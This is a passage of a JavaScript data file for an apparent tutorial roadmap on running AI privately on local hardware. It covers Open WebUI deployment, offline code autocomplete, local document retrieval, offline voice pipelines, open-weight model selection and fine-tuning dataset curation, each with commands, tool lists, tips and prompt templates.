              "Local Workstation (Single machine running Ollama + Docker)",
              "HomeLab Server (Dedicated Linux server with RTX GPU)",
              "Air-Gapped Private Office Subnet (Zero WAN access)"
            ],
            defaultOption: "Local Workstation (Single machine running Ollama + Docker)"
          },
          {
            id: "remoteAccess",
            label: "Remote Connectivity Method",
            options: [
              "Tailscale WireGuard Mesh (Recommended - Zero port forwarding)",
              "Cloudflare Zero Trust Tunnel with Access SSO",
              "Localhost Only (Strict LAN isolation)"
            ],
            defaultOption: "Tailscale WireGuard Mesh (Recommended - Zero port forwarding)"
          },
          {
            id: "storagePersistence",
            label: "Data Retention & Privacy",
            options: [
              "Persistent SQLite DB with encrypted nightly backups",
              "Ephemeral Sessions (Zero chat history retained on disk)",
              "Multi-User Role-Based Access Control (Admin + Member tiers)"
            ],
            defaultOption: "Persistent SQLite DB with encrypted nightly backups"
          }
        ],
        template: "# Complete Docker Compose Deployment for Open WebUI + Ollama\n\nservices:\n  open-webui:\n    image: ghcr.io/open-webui/open-webui:main\n    container_name: open-webui\n    restart: always\n    ports:\n      - \"3000:8080\"\n    environment:\n      - OLLAMA_BASE_URL=http://host.docker.internal:11434\n      - WEBUI_AUTH=true\n      - DEFAULT_MODELS=qwen2.5-coder:14b\n    extra_hosts:\n      - \"host.docker.internal:host-gateway\"\n    volumes:\n      - open-webui-data:/app/backend/data\n\nvolumes:\n  open-webui-data:\n    driver: local",
        expectedOutputs: [
          "Production-grade docker-compose.yml file configured for local hardware",
          "Step-by-step Tailscale installation and secure remote connection guide",
          "First-time admin onboarding and multi-user privacy configuration checklist"
        ]
      },
      learning: {
        resources: [
          {
            title: "Open WebUI: Official Getting Started & Docker Deployment Docs",
            badge: "OFFICIAL DOCS",
            url: "https://docs.openwebui.com"
          },
          {
            title: "Tailscale: Secure Remote Access to Local Homelab Web Apps",
            badge: "GUIDE",
            url: "https://tailscale.com/kb/1017/install"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Centralized Private AI Portals",
        overview: "In modern organizations, privacy compliance requires guaranteeing that proprietary prompts and intellectual property never transit third-party cloud infrastructure. Self-hosting Open WebUI decouples user-facing convenience from commercial SaaS lock-in. The web frontend runs inside an isolated container, communicating over loopback interfaces to local model daemons. User credentials, chat sessions, document embeddings, and model configurations remain stored inside encrypted local volumes that you physically control.",
        keyPoints: [
          {
            lead: "Loopback Communication",
            text: "All traffic between the browser, web server, and LLM occurs over loopback networking (`127.0.0.1`), eliminating exposure to outside sniffers."
          },
          {
            lead: "Zero-Trust Mesh Networking",
            text: "Tailscale overlays end-to-end encrypted WireGuard tunnels, allowing verified personal devices to reach internal web portals without open router ports."
          },
          {
            lead: "Hardware Centralization",
            text: "A single powerful workstation with high-end GPUs can serve responsive AI capabilities to a dozen laptops across a private local network."
          }
        ]
      }
    },

    // Node 6
    {
      id: "step-6",
      stepNumber: 6,
      phaseId: "phase-2",
      title: "100% Private Local AI Coding Assistants & Autocomplete",
      timeEstimate: "45 mins",
      difficulty: "Intermediate",
      summary: "Connect local FIM (Fill-in-the-Middle) autocomplete and chat models inside VS Code or JetBrains so proprietary source code never leaves your machine.",
      description: "Cloud coding assistants (GitHub Copilot, Cursor) transmit file context, dependencies, and active editor buffers to external servers. For developers working under strict NDAs, healthcare regulations (HIPAA), or defense contracts, cloud code transmission is strictly forbidden. By pairing the open-source Continue.dev extension with specialized local models like Qwen 2.5 Coder, you achieve sub-50ms tab autocomplete and full conversational code refactoring entirely offline.",
      playbook: {
        setup: "Install the Continue.dev extension in VS Code or JetBrains. In terminal, pull the specialized coding model and tab autocomplete model: `ollama pull qwen2.5-coder:14b` and `ollama pull qwen2.5-coder:1.5b-base`.",
        execute: "Configure `~/.continue/config.json`: Set `qwen2.5-coder:14b` as the primary chat model, and set `qwen2.5-coder:1.5b-base` as the dedicated `tabAutocompleteModel` with `\"provider\": \"ollama\"`.",
        verify: "Open a proprietary codebase in VS Code. Disconnect your Wi-Fi entirely. Trigger tab autocomplete on a new function signature and press Cmd+L to refactor a function. Confirm instantaneous offline generation."
      },
      tools: [
        {
          name: "Continue.dev",
          type: "Free",
          url: "https://www.continue.dev",
          description: "Leading open-source AI code assistant for VS Code and JetBrains supporting custom local LLMs for both autocomplete and chat.",
          bestFor: "Local code autocomplete & in-editor conversational refactoring"
        },
        {
          name: "Qwen 2.5 Coder",
          type: "Free",
          url: "https://github.com/QwenLM/Qwen2.5-Coder",
          description: "State-of-the-art open-weight coding model rivaling GPT-4o on HumanEval benchmarks, with specialized FIM base models for autocomplete.",
          bestFor: "State-of-the-art open-weight code generation"
        },
        {
          name: "VS Code",
          type: "Free",
          url: "https://code.visualstudio.com",
          description: "Extensible code editor supporting local offline language servers, telemetry disablement, and custom local AI extensions.",
          bestFor: "Developer editor integration & keybinding orchestration"
        }
      ],
      callouts: {
        mistake: "Using an Instruct/Chat model (e.g. `qwen2.5-coder:7b-instruct`) for tab autocomplete instead of a Base model (`qwen2.5-coder:1.5b-base`), causing the model to output conversational text ('Here is your code:') instead of pure code completion.",
        proTip: "Tab autocomplete requires extreme speed (<75ms latency); use a tiny 1.5B or 3B model for autocomplete, and reserve the larger 14B or 32B model for chat and refactoring.",
        mistakes: [
          "Using an Instruct/Chat model (e.g. `qwen2.5-coder:7b-instruct`) for tab autocomplete instead of a Base model (`qwen2.5-coder:1.5b-base`), causing the model to output conversational text ('Here is your code:') instead of pure code completion.",
          "Indexing a massive `node_modules` or `.git` directory in your local assistant, consuming gigabytes of RAM on irrelevant vendor code.",
          "Failing to disable VS Code telemetry, allowing Microsoft telemetry pings despite running local AI extensions."
        ],
        proTips: [
          "Tab autocomplete requires extreme speed (<75ms latency); use a tiny 1.5B or 3B model for autocomplete, and reserve the larger 14B or 32B model for chat and refactoring.",
          "Add `.continueignore` to your project root to exclude build artifacts, environment variables (`.env`), and large binary files from local context indexing.",
          "Use the `@Docs` and `@Codebase` context providers inside Continue to allow local models to retrieve relevant repository symbols without overflowing context windows."
        ]
      },
      promptLab: {
        recommendedModel: "Continue.dev with Qwen-2.5-Coder-14B & 1.5B-Base",
        variables: [
          {
            id: "editorIDE",
            label: "Developer Environment",
            options: [
              "VS Code / Cursor (Open-Source Core)",
              "JetBrains IntelliJ / WebStorm",
              "Neovim (via avante.nvim / ollama.nvim)"
            ],
            defaultOption: "VS Code / Cursor (Open-Source Core)"
          },
          {
            id: "codingLanguage",
            label: "Primary Codebase Tech Stack",
            options: [
              "TypeScript / React / Next.js Full-Stack",
              "Python / FastAPI / PyTorch ML",
              "Rust / Go Systems Engineering",
              "Java / Spring Boot Enterprise Backend"
            ],
            defaultOption: "TypeScript / React / Next.js Full-Stack"
          },
          {
            id: "autocompleteModel",
            label: "Autocomplete Engine",
            options: [
              "qwen2.5-coder:1.5b-base (Ultra-fast <50ms)",
              "qwen2.5-coder:7b-base (High accuracy <100ms)",
              "starcoder2:3b (Low memory alternative)"
            ],
            defaultOption: "qwen2.5-coder:1.5b-base (Ultra-fast <50ms)"
          }
        ],
        template: "{\n  \"models\": [\n    {\n      \"title\": \"Qwen 2.5 Coder 14B\",\n      \"provider\": \"ollama\",\n      \"model\": \"qwen2.5-coder:14b\",\n      \"contextLength\": 16384\n    }\n  ],\n  \"tabAutocompleteModel\": {\n    \"title\": \"Qwen Coder 1.5B Base FIM\",\n    \"provider\": \"ollama\",\n    \"model\": \"[autocompleteModel]\"\n  },\n  \"customCommands\": [\n    {\n      \"name\": \"audit\",\n      \"prompt\": \"Audit the selected [codingLanguage] code for security vulnerabilities, memory leaks, and missing edge-case handling. Output concise bullet points followed by the refactored code.\",\n      \"description\": \"Run local security and quality audit\"\n    }\n  ]\n}",
        expectedOutputs: [
          "Complete ~/.continue/config.json file configured for offline execution",
          "Verification instructions demonstrating local FIM autocomplete in VS Code",
          "Custom commands for in-editor unit test generation and security refactoring"
        ]
      },
      learning: {
        resources: [
          {
            title: "Continue.dev: Official Ollama Configuration & FIM Autocomplete Guide",
            badge: "OFFICIAL DOCS",
            url: "https://docs.continue.dev/setup/select-model#ollama"
          },
          {
            title: "Qwen 2.5 Coder: Official Architecture & Benchmark Report",
            badge: "GITHUB",
            url: "https://github.com/QwenLM/Qwen2.5-Coder"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Fill-in-the-Middle (FIM) Autocomplete",
        overview: "Conversational language models are trained left-to-right to predict the next token based exclusively on preceding prefix text. However, code completion requires understanding both the prefix (the code above the cursor) and the suffix (the code below the cursor). Fill-in-the-Middle (FIM) training rearranges document chunks using special boundary tokens: `<|fim_prefix|> ... <|fim_suffix|> ... <|fim_middle|>`. The model learns to synthesize code that seamlessly bridges the two surrounding contexts with sub-second latency.",
        keyPoints: [
          {
            lead: "The Base vs. Instruct Distinction",
            text: "Autocomplete requires raw Base models trained on FIM tokens; Instruct models output conversational pleasantries that break syntax."
          },
          {
            lead: "Latency Budget Requirements",
            text: "Developers type at 80-120 WPM; autocomplete suggestions must arrive within 100ms to feel natural, requiring small 1.5B-3B models."
          },
          {
            lead: "Context Window Truncation",
            text: "Autocomplete feeds only the immediate 200 lines above and 100 lines below the cursor to guarantee single-batch inference velocity."
          }
        ]
      }
    },

    // Node 7
    {
      id: "step-7",
      stepNumber: 7,
      phaseId: "phase-2",
      title: "Local Embedding Models & Offline Document RAG",
      timeEstimate: "55 mins",
      difficulty: "Intermediate",
      summary: "Index sensitive PDFs, legal contracts, and local Obsidian vaults using local vector embeddings with zero external API calls.",
      description: "Retrieval-Augmented Generation (RAG) grounds language models in your private company documents, wikis, and legal files. However, sending internal company data to cloud embedding APIs (such as OpenAI's text-embedding-3) violates confidentiality agreements. Building an air-gapped local RAG pipeline requires local embedding models (e.g. Nomic Embed Text, BGE-M3) and an embedded vector store (Qdrant, ChromaDB, or SQLite-VSS) running completely on your own machine.",
      playbook: {
        setup: "Install AnythingLLM or pull an optimized embedding model in Ollama: `ollama pull nomic-embed-text`.",
        execute: "Configure a local vector database: Deploy embedded Qdrant or use AnythingLLM's native LanceDB engine. Chunk your sensitive local PDF files into 512-token segments with 10% overlap, generate dense vector embeddings locally, and store them.",
        verify: "Submit a question referencing a specific private contract clause or financial figure. Inspect the retrieval log to confirm the exact matching chunk was fetched locally with zero outbound network traffic."
      },
      tools: [
        {
          name: "AnythingLLM",
          type: "Free",
          url: "https://anythingllm.com",
          description: "All-in-one desktop application for chatting with local documents, PDFs, and workspaces using local embeddings and vector stores.",
          bestFor: "Zero-config desktop document RAG & local PDF search"
        },
        {
          name: "Nomic Embed Text",
          type: "Free",
          url: "https://huggingface.co/nomic-ai/nomic-embed-text-v1.5",
          description: "High-performance open-weight embedding model featuring an 8,192 token context window, beating OpenAI text-embedding-3-small.",
          bestFor: "Long-context local document vectorization"
        },
        {
          name: "Qdrant",
          type: "Free",
          url: "https://qdrant.tech",
          description: "Open-source, lightning-fast vector database written in Rust, available as a lightweight single-binary embedded engine or Docker container.",
          bestFor: "Production-grade local vector indexing & hybrid search"
        }
      ],
      callouts: {
        mistake: "Using a cloud embedding API to embed private company documents while running a local LLM for generation—the sensitive data still leaked during vectorization!",
        proTip: "Use 'Hybrid Search' (combining dense vector cosine similarity with classic sparse BM25 keyword matching) to prevent vector retrieval from missing exact SKU numbers or legal citations.",
        mistakes: [
          "Using a cloud embedding API to embed private company documents while running a local LLM for generation—the sensitive data still leaked during vectorization!",
          "Setting chunk sizes too large (e.g., 2,000 tokens), causing retrieved text to drown the local model's limited context window with irrelevant fluff.",
          "Failing to add metadata tags (filename, page number, creation date) to vector chunks, making citations unverifiable."
        ],
        proTips: [
          "Use 'Hybrid Search' (combining dense vector cosine similarity with classic sparse BM25 keyword matching) to prevent vector retrieval from missing exact SKU numbers or legal citations.",
          "Nomic Embed Text supports Matryoshka dimensionality reduction, allowing you to shrink vector sizes from 768 to 256 dimensions with negligible loss.",
          "Rerank retrieved chunks using a small local cross-encoder model (e.g., `bge-reranker-base`) to promote the most relevant chunk to position #1."
        ]
      },
      promptLab: {
        recommendedModel: "AnythingLLM with Nomic Embed & Qwen-2.5-14B",
        variables: [
          {
            id: "documentFormat",
            label: "Document Ingestion Format",
            options: [
              "Confidential Financial PDF Audits & Spreadsheets",
              "Legal Contracts & Master Services Agreements (MSAs)",
              "Internal Markdown Engineering Wiki & Post-Mortems",
              "Healthcare Clinical Records & Lab Results"
            ],
            defaultOption: "Legal Contracts & Master Services Agreements (MSAs)"
          },
          {
            id: "chunkingStrategy",
            label: "Chunking & Overlap Window",
            options: [
              "512 tokens with 50-token overlap (Precision QA)",
              "1,024 tokens with 100-token overlap (Contextual Summaries)",
              "Hierarchical Parent-Document Retrieval (Chunk 256 -> Fetch 1024)"
            ],
            defaultOption: "512 tokens with 50-token overlap (Precision QA)"
          },
          {
            id: "vectorStore",
            label: "Local Vector Engine",
            options: [
              "Qdrant (Embedded Rust binary / Docker)",
              "LanceDB (Serverless zero-overhead embedded DB)",
              "ChromaDB (Local persistent Python store)"
            ],
            defaultOption: "Qdrant (Embedded Rust binary / Docker)"
          }
        ],
        template: "# Complete Air-Gapped Local RAG System Architecture\n\nTarget Ingestion: [documentFormat]\nChunking Profile: [chunkingStrategy]\nVector Database: [vectorStore]\n\nExecution Script (Python + LangChain/LlamaIndex):\n1. Ingest files using air-gapped local parser (pypdf / unstructured).\n2. Embed using local Ollama model: `nomic-embed-text:latest`.\n3. Index into [vectorStore] using Cosine Similarity Distance metric.\n4. RAG Prompt Template:\n\"\"\"\nYou are an air-gapped confidential analyst. Answer the user question strictly using the provided context chunks. If the answer cannot be found in the context, explicitly respond 'Information not found in local document archive.' Never extrapolate or assume facts.\n\nContext:\n{context}\n\nQuestion: {question}\nAnswer with exact citations (Filename & Page Number):\n\"\"\"",
        expectedOutputs: [
          "Executable Python local RAG pipeline script using local embeddings",
          "Verification protocol proving zero network calls occurred during search",
          "Strict anti-hallucination prompt template enforcing citation-backed answers"
        ]
      },
      learning: {
        resources: [
          {
            title: "Qdrant: Running Local Embedded Vector Search",
            badge: "OFFICIAL DOCS",
            url: "https://qdrant.tech/documentation/quickstart/"
          },
          {
            title: "AnythingLLM: Architecture & Offline Workspace Security",
            badge: "GUIDE",
            url: "https://docs.anythingllm.com"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Air-Gapped Dense Vector Retrieval",
        overview: "Retrieval-Augmented Generation solves two critical LLM flaws: hallucination and knowledge obsolescence. Traditional search relies on lexical keyword matching (BM25), which fails when queries use synonyms. Dense vector embeddings translate text into high-dimensional coordinate vectors where semantically similar concepts cluster together regardless of exact phrasing. In an air-gapped system, both the vectorizer and the vector database execute locally in memory, ensuring that proprietary knowledge graphs remain entirely private.",
        keyPoints: [
          {
            lead: "The Embedding Privacy Boundary",
            text: "A RAG system is only as private as its weakest link; embedding calculations must run locally using open-weight embedding models."
          },
          {
            lead: "Cosine Distance Metric",
            text: "Vector databases measure the cosine of the angle between query and document vectors to identify top-k nearest semantic matches."
          },
          {
            lead: "Grounding and Hallucination Suppression",
            text: "Injecting exact retrieved text chunks into the LLM system prompt confines the generative engine to verifiable source facts."
          }
        ]
      }
    },

    // Node 8
    {
      id: "step-8",
      stepNumber: 8,
      phaseId: "phase-2",
      title: "Offline Speech-to-Text & Local Neural Voice Synthesis",
      timeEstimate: "40 mins",
      difficulty: "Beginner",
      summary: "Run ultra-fast local audio transcription and natural text-to-speech pipelines completely air-gapped from the cloud.",
      description: "Voice-driven AI workflows often inadvertently leak sensitive conversations by streaming microphone audio to third-party transcription endpoints (e.g. OpenAI Whisper API, ElevenLabs). Today, open-weight voice models—such as OpenAI's Whisper executed via C++ (whisper.cpp) and breakthrough lightweight TTS engines like Kokoro and Piper—can transcribe hours of audio and synthesize studio-quality speech locally in real time on standard consumer CPUs and GPUs with zero external network connectivity.",
      playbook: {
        setup: "Install whisper.cpp via git clone or homebrew (`brew install whisper-cpp`). Download the quantized small or medium model (`ggml-medium.en-q5_0.bin`).",
        execute: "Transcribe a test WAV voice recording completely offline: `whisper-cli -m ggml-medium.en-q5_0.bin -f voice_note.wav -otxt`. Test Kokoro-82M TTS using Python to synthesize a voice response in under 200ms.",
        verify: "Disconnect all network adapters. Run live real-time microphone transcription with `whisper-cli --stream`. Confirm accurate real-time speech transcription with zero audio packets leaving your network interface."
      },
      tools: [
        {
          name: "Whisper.cpp",
          type: "Free",
          url: "https://github.com/ggerganov/whisper.cpp",
          description: "High-performance C/C++ port of OpenAI's Whisper speech recognition model, optimized for Apple Silicon Metal and CPU AVX extensions.",
          bestFor: "Real-time offline audio transcription & voice input"
        },
        {
          name: "Kokoro TTS",
          type: "Free",
          url: "https://huggingface.co/hexgrad/Kokoro-82M",
          description: "Breakthrough 82M parameter open-weight text-to-speech model producing natural, human-like voice audio with sub-second generation speeds.",
          bestFor: "Natural sounding offline voice synthesis"
        },
        {
          name: "Piper TTS",
          type: "Free",
          url: "https://github.com/rhasspy/piper",
          description: "Fast, local neural text-to-speech system designed to run on Raspberry Pi and low-power hardware in real time.",
          bestFor: "Ultra-low-latency real-time voice synthesis on low-power devices"
        }
      ],
      callouts: {
        mistake: "Streaming uncompressed raw microphone audio over the internet to a cloud voice API during confidential board meetings or private counseling sessions.",
        proTip: "Whisper.cpp on Apple Silicon runs up to 10x faster than real time using CoreML acceleration: a 1-hour recording transcribes in under 6 minutes on an M-series Mac.",
        mistakes: [
          "Streaming uncompressed raw microphone audio over the internet to a cloud voice API during confidential board meetings or private counseling sessions.",
          "Using the massive 3GB Whisper Large model for real-time conversational voice bots when `small.en` or `medium.en` yields 98% accuracy at 4x the speed.",
          "Failing to normalize and remove background noise from microphone input before feeding audio to speech recognition models."
        ],
        proTips: [
          "Whisper.cpp on Apple Silicon runs up to 10x faster than real time using CoreML acceleration: a 1-hour recording transcribes in under 6 minutes on an M-series Mac.",
          "Pair Whisper.cpp with local Ollama and Kokoro TTS to build a completely private, air-gapped Jarvis voice assistant on your desktop.",
          "Compile whisper.cpp with Metal flags (`WHISPER_METAL=1 make`) to offload acoustic matrix operations entirely to the Mac GPU."
        ]
      },
      promptLab: {
        recommendedModel: "Whisper.cpp (Medium.en) + Kokoro TTS",
        variables: [
          {
            id: "voiceTask",
            label: "Speech Processing Objective",
            options: [
              "Real-Time Conversational Voice Assistant (Sub-500ms voice loop)",
              "Batch Meeting Transcription & Action Item Extraction",
              "Audiobook & Long-Form Document Narration"
            ],
            defaultOption: "Real-Time Conversational Voice Assistant (Sub-500ms voice loop)"
          },
          {
            id: "whisperTier",
            label: "Whisper Model Sizing",
            options: [
              "whisper-base.en (Fastest, low accuracy on jargon)",
              "whisper-small.en (Optimal balance for real-time conversational agents)",
              "whisper-medium.en (High accuracy for medical/technical vocabulary)"
            ],
            defaultOption: "whisper-small.en (Optimal balance for real-time conversational agents)"
          },
          {
            id: "ttsEngine",
            label: "Local Voice Engine",
            options: [
              "Kokoro-82M (Highest natural conversational cadence)",
              "Piper TTS (Lowest latency, runs on any CPU)",
              "Bark (Full emotional voice & laughter synthesis)"
            ],
            defaultOption: "Kokoro-82M (Highest natural conversational cadence)"
          }
        ],
        template: "# Complete Offline Audio Pipeline (STT -> LLM -> TTS)\n\nimport subprocess\n\ndef transcribe_audio(audio_path):\n    # Execute local whisper.cpp with zero network access\n    cmd = [\"whisper-cli\", \"-m\", \"models/[whisperTier].bin\", \"-f\", audio_path, \"-nt\", \"-otxt\"]\n    subprocess.run(cmd, check=True)\n    with open(f\"{audio_path}.txt\", \"r\") as f:\n        return f.read().strip()\n\ndef synthesize_speech(text_response, output_wav):\n    # Execute local [ttsEngine] inference\n    print(f\"Synthesizing voice response using [ttsEngine]...\")\n    # Generate offline speech file with zero cloud API keys",
        expectedOutputs: [
          "Complete local Python script orchestrating offline STT and TTS",
          "Terminal compilation commands for whisper.cpp with GPU hardware flags",
          "End-to-end latency benchmark measuring user voice in to audio voice out"
        ]
      },
      learning: {
        resources: [
          {
            title: "Whisper.cpp: High Performance C/C++ Speech Recognition",
            badge: "GITHUB",
            url: "https://github.com/ggerganov/whisper.cpp"
          },
          {
            title: "Kokoro-82M: Open-Source Natural Speech Synthesis Weights",
            badge: "OFFICIAL DOCS",
            url: "https://huggingface.co/hexgrad/Kokoro-82M"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Local Neural Audio Processing",
        overview: "Voice interactions have historically been tethered to cloud APIs because deep neural acoustic models required extensive server farm infrastructure. Modern innovations in transformer quantization, attention optimizations, and compact text-to-speech architectures have democratized voice computing. Whisper processes log-mel spectrogram audio features through an encoder-decoder transformer to output timestamped text. In reverse, engines like Kokoro convert text phonemes into expressive acoustic mel-spectrograms synthesized through neural vocoders—all operating inside local RAM.",
        keyPoints: [
          {
            lead: "Zero Telemetry Confidentiality",
            text: "Processing acoustic signals locally protects confidential spoken conversations from corporate wiretapping or regulatory violations."
          },
          {
            lead: "Log-Mel Spectrogram Encoding",
            text: "Audio is sliced into 30-second windows and converted into visual frequency spectrograms before passing into transformer layers."
          },
          {
            lead: "Low-Latency Voice Turnarounds",
            text: "Eliminating internet transit time allows local voice agents to achieve sub-500ms conversational turnarounds on consumer hardware."
          }
        ]
      }
    },

    // Node 9
    {
      id: "step-9",
      stepNumber: 9,
      phaseId: "phase-3",
      title: "Selecting Frontier Open-Weight Models (Llama, Qwen, DeepSeek, Mistral)",
      timeEstimate: "50 mins",
      difficulty: "Intermediate",
      summary: "Match specialized open models (DeepSeek-R1 for reasoning, Qwen-Coder for programming, Llama/Mistral for general tasks) to specific workflows.",
      description: "The open-weight ecosystem is no longer a monolithic race where one generalist model dominates. Instead, specialized model families have emerged that outperform proprietary frontier models in dedicated domains. DeepSeek-R1 provides chain-of-thought mathematical and algorithmic reasoning; Qwen 2.5 Coder excels at code refactoring and syntax compliance; Llama 3.3 70B delivers general-purpose conversational fluency; and Mistral models provide dense multilingual versatility.",
      playbook: {
        setup: "Review the Hugging Face Open LLM Leaderboard and LMSYS Chatbot Arena filtered by 'Open Weights'.",
        execute: "Map your application requirements to model families: Select `deepseek-r1:14b` or `deepseek-r1:32b` for complex logic, multi-step math, and algorithmic planning; select `qwen2.5-coder:14b` or `32b` for codebases; select `llama3.3:70b` for open conversational intelligence.",
        verify: "Run an identical multi-step logic test across your shortlisted models in Ollama (`ollama run deepseek-r1:14b` vs `ollama run llama3.1:8b`). Verify that the reasoning chain produces zero hallucinated assertions."
      },
      tools: [
        {
          name: "Hugging Face Open LLM Leaderboard",
          type: "Free",
          url: "https://huggingface.co/spaces/open-llm-leaderboard/open_llm_leaderboard",
          description: "Authoritative benchmark leaderboard tracking open-weight models across MMLU, GSM8K, MATH, and HumanEval evaluation suites.",
          bestFor: "Objective benchmark comparison & model discovery"
        },
        {
          name: "Ollama Model Library",
          type: "Free",
          url: "https://ollama.com/library",
          description: "Curated registry of verified, packaged open-weight models ready for instant single-command local deployment.",
          bestFor: "Single-command verified model pulling & execution"
        },
        {
          name: "Artificial Analysis",
          type: "Free",
          url: "https://artificialanalysis.ai",
          description: "Independent benchmarking platform providing speed, price, latency, and quality benchmarks for open and proprietary models.",
          bestFor: "Quality vs. speed comparative analytics"
        }
      ],
      callouts: {
        mistake: "Choosing a model based solely on raw parameter count (e.g. older 70B model) rather than modern architecture: modern 14B models consistently outperform two-year-old 70B models.",
        proTip: "DeepSeek-R1 distilled models (`deepseek-r1:14b` and `deepseek-r1:32b`) generate detailed `<think>` tags demonstrating step-by-step reasoning before outputting their final answer.",
        mistakes: [
          "Choosing a model based solely on raw parameter count (e.g. older 70B model) rather than modern architecture: modern 14B models consistently outperform two-year-old 70B models.",
          "Using a reasoning model like DeepSeek-R1 for high-speed autocomplete tasks where latency (<100ms) is 10x more important than chain-of-thought contemplation.",
          "Ignoring model license terms: verify Apache-2.0 or MIT licensing if deploying open-weight models inside commercial proprietary enterprise software."
        ],
        proTips: [
          "DeepSeek-R1 distilled models (`deepseek-r1:14b` and `deepseek-r1:32b`) generate detailed `<think>` tags demonstrating step-by-step reasoning before outputting their final answer.",
          "For structured JSON extraction, Qwen 2.5 models feature superior native grammar and schema adherence compared to standard Llama models.",
          "Use small 8B models as local routing agents: have them classify user intent in 150ms and route complex logic to a 32B or 70B model."
        ]
      },
      promptLab: {
        recommendedModel: "DeepSeek-R1-Distill-Qwen-14B / Qwen-2.5-Coder-32B",
        variables: [
          {
            id: "taskCategory",
            label: "Primary Production Task",
            options: [
              "Deep Mathematical & Logical Reasoning",
              "Full-Stack Software Engineering & Refactoring",
              "Summarization of Lengthy Legal / Technical Documents",
              "Agentic Function Calling & Database Orchestration"
            ],
            defaultOption: "Deep Mathematical & Logical Reasoning"
          },
          {
            id: "modelSelection",
            label: "Recommended Open Model",
            options: [
              "DeepSeek-R1-Distill-Qwen-14B (Chain-of-Thought Reasoning)",
              "Qwen 2.5 Coder 32B Instruct (Programming SOTA)",
              "Llama 3.3 70B Instruct (General Enterprise Intelligence)",
              "Mistral Small 24B (Multilingual Enterprise Workhorse)"
            ],
            defaultOption: "DeepSeek-R1-Distill-Qwen-14B (Chain-of-Thought Reasoning)"
          },
          {
            id: "responseFormat",
            label: "Output Formatting Protocol",
            options: [
              "Chain-of-Thought with <think> reasoning blocks",
              "Strict JSON schema matching TypeScript interface",
              "Concise Markdown executive brief"
            ],
            defaultOption: "Chain-of-Thought with <think> reasoning blocks"
          }
        ],
        template: "# Open-Weight Model Evaluation Suite\n\nTarget Domain: [taskCategory]\nEvaluating Model: [modelSelection]\nFormatting: [responseFormat]\n\nTest Prompt:\n\"A software company has 4 engineers. Engineer A can complete a ticket in 4 hours. Engineer B takes 6 hours. Engineer C takes 8 hours. Engineer D takes 12 hours. If they all work in parallel on a backlog of 36 identical tickets, exactly how many hours will it take to clear the backlog? Show step-by-step arithmetic proof.\"\n\nObserve whether [modelSelection] produces accurate mathematical logic without hallucinating reciprocal fractions.",
        expectedOutputs: [
          "Complete chain-of-thought mathematical derivation",
          "Analysis of reasoning speed (tokens/sec) vs accuracy",
          "Verification of clean final answer formatting"
        ]
      },
      learning: {
        resources: [
          {
            title: "Hugging Face Open LLM Leaderboard 2.0",
            badge: "OFFICIAL DOCS",
            url: "https://huggingface.co/spaces/open-llm-leaderboard/open_llm_leaderboard"
          },
          {
            title: "DeepSeek-R1: Research Paper & Technical Architecture",
            badge: "GUIDE",
            url: "https://github.com/deepseek-ai/DeepSeek-R1"
          }
        ]
      },
      conceptGuide: {
        title: "The Landscape of Specialized Open-Weight Architectures",
        overview: "The era of one-size-fits-all AI is over. Open-source research has demonstrated that training specialized models on high-quality synthetic datasets yields domain mastery without requiring hundreds of billions of parameters. DeepSeek-R1 pioneered reinforcement learning without supervised warm-ups to discover emergent reasoning chains. Meanwhile, Alibaba's Qwen team achieved code synthesis parity with proprietary models by curating vast multilingual code corpuses. Navigating local AI requires matching specific model architectures to task requirements.",
        keyPoints: [
          {
            lead: "The Reasoning Revolution (R1)",
            text: "Reasoning models trade token generation volume for accuracy: they output hundreds of internal thoughts before finalizing answers."
          },
          {
            lead: "Domain Specialization Over Scale",
            text: "A 14B model fine-tuned specifically on code will consistently defeat an unspecialized 70B generalist on software engineering benchmarks."
          },
          {
            lead: "Weight Weights vs. Model Distillation",
            text: "Distilled models transfer the reasoning pathways of 671B frontier models down into compact 8B-32B architectures runnable on personal hardware."
          }
        ]
      }
    },

    // Node 10
    {
      id: "step-10",
      stepNumber: 10,
      phaseId: "phase-3",
      title: "Dataset Curation & ShareGPT Formatting for Fine-Tuning",
      timeEstimate: "60 mins",
      difficulty: "Advanced",
      summary: "Clean private domain logs and structure high-quality synthetic instruction-tuning pairs in JSONL/ShareGPT format.",
      description: "Fine-tuning a local model is useless if the training dataset contains noisy, contradictory, or low-quality data. Modern LLM alignment relies on the principle of 'Quality over Quantity': 1,000 meticulously verified, high-entropy instruction pairs will fine-tune a model far more effectively than 100,000 scraped, repetitive web rows. Mastering dataset curation requires cleaning company support logs, de-duplicating proprietary documents, and formatting them into standard Alpaca or ShareGPT JSONL schemas.",
      playbook: {
        setup: "Install Argilla or use Python with pandas to inspect raw internal logs, customer support tickets, or code repositories.",
        execute: "Filter out noisy, one-word, or sensitive records. Convert the cleaned examples into ShareGPT multi-turn conversation format: `[{\"from\": \"system\", \"value\": \"...\"}, {\"from\": \"human\", \"value\": \"...\"}, {\"from\": \"gpt\", \"value\": \"...\"}]`. Validate schema integrity using Pydantic.",
        verify: "Run a dataset validation script to check token lengths, inspect distribution histograms, and confirm zero syntax errors across the `.jsonl` file."
      },
      tools: [
        {
          name: "Argilla",
          type: "Free",
          url: "https://argilla.io",
          description: "Open-source data curation and human feedback platform for reviewing, annotating, and filtering instruction datasets for LLMs.",
          bestFor: "Human-in-the-loop dataset annotation & quality validation"
        },
        {
          name: "Hugging Face Datasets",
          type: "Free",
          url: "https://huggingface.co/docs/datasets",
          description: "High-performance Python library for loading, transforming, filtering, and streaming large-scale NLP datasets.",
          bestFor: "Dataset transformation & format conversion"
        },
        {
          name: "Distilabel",
          type: "Free",
          url: "https://github.com/argilla-io/distilabel",
          description: "Framework for generating synthetic instruction datasets and evaluating LLM outputs using local open-weight models.",
          bestFor: "Synthetic instruction pair generation using local LLMs"
        }
      ],
      callouts: {
        mistake: "Training on thousands of raw customer support chats without scrubbing employee names, phone numbers, or passwords, baking private PII into model weights.",
        proTip: "Use the 'LIMA' principle (Less Is More for Alignment): 1,000 exceptionally crafted, diverse prompt-response pairs produce a more capable fine-tune than 50,000 mediocre pairs.",
        mistakes: [
          "Training on thousands of raw customer support chats without scrubbing employee names, phone numbers, or passwords, baking private PII into model weights.",
          "Including contradictory instructions in the dataset where identical questions have wildly inconsistent answer formats.",
          "Failing to enforce exact token truncation limits, causing training batches to OOM on unexpected outlier rows."
        ],
        proTips: [
